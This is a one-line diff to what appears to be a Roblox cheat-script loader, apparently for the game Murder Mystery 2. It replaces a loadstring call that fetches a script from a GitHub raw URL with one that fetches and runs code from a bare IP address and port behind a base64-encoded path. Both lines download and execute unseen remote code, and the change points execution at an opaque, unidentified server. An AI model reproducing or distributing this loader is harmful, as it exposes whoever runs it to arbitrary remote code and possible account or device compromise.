@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AguaHub/-/refs/heads/main/MM2-Menu"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
